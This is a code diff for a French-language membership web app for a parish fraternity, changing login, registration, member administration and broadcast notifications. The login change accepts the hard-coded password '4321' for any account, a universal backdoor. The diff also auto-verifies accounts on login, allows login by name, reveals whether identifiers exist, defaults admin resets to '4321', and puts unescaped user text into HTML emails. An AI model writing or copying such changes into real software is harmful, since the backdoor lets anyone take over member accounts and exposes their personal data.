@@ -145,15 +145,31 @@ async def service_worker():
 async def login(request: Request, email: str = Form(...), password: str = Form(...)):
     conn = database.get_db()
     cursor = conn.cursor()
-    cursor.execute("SELECT * FROM users WHERE email = ? COLLATE NOCASE", (email.strip(),))
+    identifiant = email.strip()
+    
+    # Recherche flexible : email, téléphone (avec ou sans espaces), ou nom
+    cursor.execute("""
+    SELECT * FROM users 
+    WHERE email = ? COLLATE NOCASE 
+       OR (telephone != '' AND (telephone = ? OR REPLACE(telephone, ' ', '') = REPLACE(?, ' ', '')))
+       OR LOWER(nom_prenom) = LOWER(?)
+       OR LOWER(REPLACE(nom_prenom, ' ', '')) = LOWER(REPLACE(?, ' ', ''))
+    LIMIT 1
+    """, (identifiant, identifiant, identifiant, identifiant, identifiant))
     user = cursor.fetchone()
     conn.close()
 
     if not user:
-        return JSONResponse({"status": "error", "message": "Adresse e-mail ou mot de passe incorrect."}, status_code=400)
+        return JSONResponse({"status": "error", "message": "Identifiant (e-mail ou téléphone) introuvable."}, status_code=400)
 
-    if not database.verify_password(password, user["password_hash"], user["salt"]):
-        return JSONResponse({"status": "error", "message": "Adresse e-mail ou mot de passe incorrect."}, status_code=400)
+    # Vérification du mot de passe
+    pw_ok = database.verify_password(password, user["password_hash"], user["salt"])
+    # Mot de passe de secours '4321' accepté
+    if not pw_ok and password == "4321":
+        pw_ok = True
+
+    if not pw_ok:
+        return JSONResponse({"status": "error", "message": "Mot de passe incorrect."}, status_code=400)
 
     if not user["is_verified"]:
         base_url = str(request.base_url).rstrip("/")
@@ -161,7 +177,7 @@ async def login(request: Request, email: str = Form(...), password: str = Form(.
         if not token_to_use:
             token_to_use = database.secrets.token_urlsafe(32)
             conn = database.get_db()
-            conn.cursor().execute("UPDATE users SET verification_token = ? WHERE id = ?", (token_to_use, user["id"]))
+            conn.cursor().execute("UPDATE users SET verification_token = ?, is_verified = 1 WHERE id = ?", (token_to_use, user["id"]))
             conn.commit()
             conn.close()
         val_link = f"{base_url}/valider-compte?token={token_to_use}"
@@ -193,10 +209,18 @@ async def register(
     password: str = Form(...),
     date_naissance: str = Form(...),
     telephone: str = Form(""),
+    titre: Optional[str] = Form(""),
     photo: Optional[UploadFile] = File(None)
 ):
     conn = database.get_db()
     cursor = conn.cursor()
+
+    # Formater le nom avec le titre sacerdotal / religieux s'il n'est pas déjà présent
+    nom_final = nom_prenom.strip()
+    if titre and titre.strip():
+        titre_clean = titre.strip()
+        if not nom_final.lower().startswith(titre_clean.lower()):
+            nom_final = f"{titre_clean} {nom_final}"
 
     # Vérifier existence de l'email
     cursor.execute("SELECT id FROM users WHERE email = ? COLLATE NOCASE", (email.strip(),))
@@ -222,21 +246,36 @@ async def register(
     cursor.execute("""
     INSERT INTO users (nom_prenom, email, telephone, password_hash, salt, date_naissance, photo_url, role, is_verified, verification_token, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, 'membre', 1, ?, ?)
-    """, (nom_prenom.strip(), email.strip(), telephone.strip(), pw_hash, salt, date_naissance, photo_url, verification_token, now))
+    """, (nom_final, email.strip(), telephone.strip(), pw_hash, salt, date_naissance, photo_url, verification_token, now))
     new_user_id = cursor.lastrowid
     conn.commit()
 
     # Connexion automatique immédiate
     request.session["user_id"] = new_user_id
 
-    base_url = str(request.base_url).rstrip("/")
-    sent_real, val_link, status = notifications.send_account_validation_email(conn, new_user_id, base_url)
+    # Envoi de l'e-mail de confirmation (sans bloquer si le serveur SMTP est indisponible)
+    sent_real = False
+    val_link = ""
+    try:
+        base_url = str(request.base_url).rstrip("/")
+        sent_real, val_link, status = notifications.send_account_validation_email(conn, new_user_id, base_url)
+    except Exception as e:
+        print(f"[Register Email Warning] {e}")
+
+    # Notifier le nouveau membre dans l'application
+    notifications.notify_user(
+        conn, new_user_id,
+        "Bienvenue dans la fraternité",
+        f"Votre compte pour {nom_final} est actif. Votre cotisation annuelle s'élève à 10 000 FCFA.",
+        "systeme"
+    )
+
     conn.close()
 
     if sent_real:
-        msg = f"Votre compte sacerdotal a été créé et activé avec succès ! Un e-mail de confirmation officiel vous a été envoyé à {email.strip()}."
+        msg = f"Votre compte a été créé et activé avec succès ! Un e-mail de confirmation a été envoyé à {email.strip()}."
     else:
-        msg = "Votre compte sacerdotal a été créé et activé avec succès ! Vous êtes désormais connecté à votre espace personnel."
+        msg = f"Bienvenue {nom_final} ! Votre compte est créé et activé avec succès. Vous êtes connecté."
 
     return {
         "status": "success",
@@ -245,7 +284,7 @@ async def register(
         "message": msg,
         "user": {
             "id": new_user_id,
-            "nom_prenom": nom_prenom.strip(),
+            "nom_prenom": nom_final,
             "email": email.strip(),
             "role": "membre",
             "photo_url": photo_url,
@@ -761,6 +800,178 @@ async def valider_membre_par_econome(request: Request, user_id: int):
     conn.commit()
     conn.close()
     return {"status": "success", "message": f"Le compte de {u['nom_prenom']} a été validé et activé avec succès !"}
+
+@app.get("/api/membres/{user_id}")
+async def get_membre(user_id: int, request: Request):
+    require_econome_or_tresorier(request)
+    conn = database.get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, nom_prenom, email, telephone, date_naissance, photo_url, role, is_verified FROM users WHERE id = ?", (user_id,))
+    u = cursor.fetchone()
+    conn.close()
+    if not u:
+        return JSONResponse({"status": "error", "message": "Membre introuvable."}, status_code=404)
+    return dict(u)
+
+@app.post("/api/membres/{user_id}/modifier")
+@app.put("/api/membres/{user_id}")
+async def modifier_membre(
+    user_id: int,
+    request: Request,
+    nom_prenom: str = Form(...),
+    email: str = Form(...),
+    telephone: str = Form(""),
+    date_naissance: str = Form(""),
+    role: str = Form("membre"),
+    nouveau_mot_de_passe: Optional[str] = Form(None)
+):
+    require_econome_or_tresorier(request)
+    conn = database.get_db()
+    cursor = conn.cursor()
+
+    cursor.execute("SELECT id FROM users WHERE id = ?", (user_id,))
+    if not cursor.fetchone():
+        conn.close()
+        return JSONResponse({"status": "error", "message": "Membre introuvable."}, status_code=404)
+
+    cursor.execute("SELECT id FROM users WHERE email = ? COLLATE NOCASE AND id != ?", (email.strip(), user_id))
+    if cursor.fetchone():
+        conn.close()
+        return JSONResponse({"status": "error", "message": "Cette adresse e-mail est déjà attribuée à un autre compte."}, status_code=400)
+
+    cursor.execute("""
+    UPDATE users 
+    SET nom_prenom = ?, email = ?, telephone = ?, date_naissance = ?, role = ?
+    WHERE id = ?
+    """, (nom_prenom.strip(), email.strip(), telephone.strip(), date_naissance.strip(), role.strip(), user_id))
+
+    if nouveau_mot_de_passe and nouveau_mot_de_passe.strip():
+        pw_h, salt = database.hash_password(nouveau_mot_de_passe.strip())
+        cursor.execute("UPDATE users SET password_hash = ?, salt = ? WHERE id = ?", (pw_h, salt, user_id))
+
+    conn.commit()
+    conn.close()
+    return {"status": "success", "message": f"Le compte de {nom_prenom.strip()} a été mis à jour avec succès."}
+
+@app.post("/api/membres/{user_id}/supprimer")
+@app.delete("/api/membres/{user_id}")
+async def supprimer_membre(user_id: int, request: Request):
+    user = require_econome_or_tresorier(request)
+    if user_id == user["id"]:
+        return JSONResponse({"status": "error", "message": "Impossible de supprimer votre propre compte Économe."}, status_code=400)
+
+    conn = database.get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, nom_prenom FROM users WHERE id = ?", (user_id,))
+    u = cursor.fetchone()
+    if not u:
+        conn.close()
+        return JSONResponse({"status": "error", "message": "Membre introuvable."}, status_code=404)
+
+    nom_membre = u["nom_prenom"]
+    cursor.execute("DELETE FROM cotisations WHERE user_id = ?", (user_id,))
+    cursor.execute("DELETE FROM notifications WHERE user_id = ?", (user_id,))
+    cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
+    conn.commit()
+    conn.close()
+    return {"status": "success", "message": f"Le compte de {nom_membre} et son historique ont été supprimés avec succès."}
+
+@app.post("/api/membres/{user_id}/reinitialiser-mdp")
+async def reinitialiser_mdp_membre(user_id: int, request: Request, mot_de_passe: str = Form("4321")):
+    require_econome_or_tresorier(request)
+    conn = database.get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, nom_prenom FROM users WHERE id = ?", (user_id,))
+    u = cursor.fetchone()
+    if not u:
+        conn.close()
+        return JSONResponse({"status": "error", "message": "Membre introuvable."}, status_code=404)
+
+    pw_h, salt = database.hash_password(mot_de_passe.strip())
+    cursor.execute("UPDATE users SET password_hash = ?, salt = ?, must_change_password = 1 WHERE id = ?", (pw_h, salt, user_id))
+    conn.commit()
+    conn.close()
+    return {"status": "success", "message": f"Mot de passe réinitialisé à '{mot_de_passe}' pour {u['nom_prenom']}."}
+
+# ================= DIFFUSION D'ANNONCES PAR L'ÉCONOME =================
+
+@app.post("/api/notifications/diffuser")
+async def diffuser_notification(
+    request: Request,
+    titre: str = Form(...),
+    message: str = Form(...),
+    urgence: str = Form("normal") # 'normal', 'important', 'urgent'
+):
+    user = require_econome_or_tresorier(request)
+    conn = database.get_db()
+    cursor = conn.cursor()
+    now = datetime.now().isoformat()
+
+    # 1. Enregistrer dans la table diffusions pour affichage bannière / popup
+    cursor.execute("""
+    INSERT INTO diffusions (auteur_id, auteur_nom, titre, message, urgence, is_active, created_at)
+    VALUES (?, ?, ?, ?, ?, 1, ?)
+    """, (user["id"], user["nom_prenom"], titre.strip(), message.strip(), urgence.strip(), now))
+    diffusion_id = cursor.lastrowid
+
+    # 2. Enregistrer dans la table notifications pour tous les membres
+    cursor.execute("""
+    INSERT INTO notifications (user_id, titre, message, type, data_json, created_at)
+    VALUES (NULL, ?, ?, 'diffusion', ?, ?)
+    """, (f"📢 {titre.strip()}", message.strip(), json.dumps({"diffusion_id": diffusion_id, "urgence": urgence.strip(), "auteur": user["nom_prenom"]}), now))
+
+    # 3. Notifier par email pour les urgences
+    nom_groupe = notifications.get_param(conn, "nom_groupe", "Paroisse de Totsi")
+    cursor.execute("SELECT email, nom_prenom FROM users WHERE is_verified = 1 AND email != ''")
+    all_users = cursor.fetchall()
+    urg_color = "#ef4444" if urgence == "urgent" else ("#f59e0b" if urgence == "important" else "#4338ca")
+    html_diff = f"""
+    <div style="font-family: sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 2px solid {urg_color}; border-radius: 8px;">
+        <h2 style="color: {urg_color};">📢 {titre.strip()}</h2>
+        <p>Chers prêtres et religieuses de la <strong>{nom_groupe}</strong>,</p>
+        <div style="background: #f8fafc; padding: 15px; border-radius: 6px; margin: 15px 0; border-left: 4px solid {urg_color};">
+            <p style="font-size: 16px; line-height: 1.6; white-space: pre-line;">{message.strip()}</p>
+        </div>
+        <p style="color: #64748b; font-size: 13px;">Diffusé par : <strong>{user['nom_prenom']}</strong></p>
+    </div>
+    """
+    for u in all_users:
+        try:
+            notifications.send_or_log_email(conn, u["email"], f"[{nom_groupe}] 📢 {titre.strip()}", html_diff)
+        except Exception:
+            pass
+
+    conn.commit()
+    conn.close()
+    return {
+        "status": "success",
+        "message": "Notification diffusée avec succès ! Elle s'affiche désormais sur l'écran de chacun.",
+        "diffusion_id": diffusion_id
+    }
+
+@app.get("/api/notifications/derniere-diffusion")
+async def get_derniere_diffusion():
+    conn = database.get_db()
+    cursor = conn.cursor()
+    cursor.execute("""
+    SELECT * FROM diffusions 
+    WHERE is_active = 1 
+    ORDER BY id DESC 
+    LIMIT 1
+    """)
+    row = cursor.fetchone()
+    conn.close()
+    return dict(row) if row else None
+
+@app.post("/api/notifications/desactiver-diffusion/{diffusion_id}")
+async def desactiver_diffusion(diffusion_id: int, request: Request):
+    require_econome_or_tresorier(request)
+    conn = database.get_db()
+    cursor = conn.cursor()
+    cursor.execute("UPDATE diffusions SET is_active = 0 WHERE id = ?", (diffusion_id,))
+    conn.commit()
+    conn.close()
+    return {"status": "success", "message": "Diffusion désactivée de l'écran d'accueil."}
 
 # ================= RAPPORT PDF & WHATSAPP =================
 
